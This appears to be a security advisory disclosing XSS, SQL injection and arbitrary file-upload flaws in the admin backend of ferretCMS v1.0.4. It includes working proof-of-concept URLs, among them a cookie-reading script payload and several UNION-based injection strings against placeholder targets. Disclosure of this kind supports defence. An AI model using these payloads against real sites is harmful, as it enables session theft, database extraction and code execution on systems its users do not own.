==========================
Vulnerability Description:
==========================

The content management system ferretCMS v.1.0.4, which is currently in
alpha development stage, suffers from multiple stored/reflecting XSS- and
SQLi-vulnerabilities in its administrative backend.
Moreover, there exists the possibility to upload arbitrary files via the
administrative backend, which can be executed by unauthenticated users, too.

==================
Technical Details:
==================

A reflecting XSS vulnerability can be found in the parameter "action" used
in the file admin.php:

http://
{TARGET}/admin.php?type=search&action=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E

Stored XSS vulnerabilities resides in the logging functionality of
ferretCMS. On the administrative backend, the administrator has the
opportunity to watch events stored in a log. An event, that gets logged,
are login-attempts to the administrative backend, where the used username
is displayed, too. An attacker can abuse this, by trying to log in with
JavaScript-code instead of a username. That code gets executed in the logs.

Login-form is located here: http://{TARGET}/admin.php

XSS gets executed here: http://{TARGET}/admin.php?type=log&action=read

Another stored XSS vulnerability can be found in the pagetitle of a new
blog entry that is created by the administrator:

vulnerable form: http://{TARGET}/admin.php?type=page&action=insert&p=

XSS gets executed here: http://{TARGET}/admin.php?type=page&action=read


The following URLs are prone to SQL injection attacks:

http://
{TARGET}/admin.php?type=site&action=update&p=1+and+1=2+union+select+1,version%28%29,3,4+--+

http://
{TARGET}/admin.php?type=customkey&action=update&p=1+and+1=2+union+select+1,version%28%29,database%28%29,4+--+

http://
{TARGET}/admin.php?type=account&action=update&p=1+and+1=2+union+select+1,database%28%29,3,4,5,version%28%29,7,8,9+--+

http://
{TARGET}/admin.php?type=plugin&action=update&p=1+and+1=2+union+select+1,database%28%29,version%28%29,4+--+

http://
{TARGET}/admin.php?type=template&action=update&p=1+and+1=2+union+select+1,version%28%29,database%28%29,user%28%29,5+--+

http://
{TARGET}/admin.php?type=permissiongroup&action=update&p=1+and+1=2+union+select+1,version%28%29,3,4+--+

http://
{TARGET}/admin.php?type=page&action=update&p=1+and+substring%28version%28%29,1,1%29=5+--+

Last but not least there is a file-upload functionality in the
administrative backend of ferretCMS. The administrator can upload arbitrary
files here via the following URL:

http://localhost/ferretCMS/admin.php?type=uploader&action=upload

Any unauthenticated user can execute/read those files that had been
uploaded by visiting the following URL:

http://{TARGET}/custom/uploads/{NAME_OF_THE_UPLOADED_FILE}
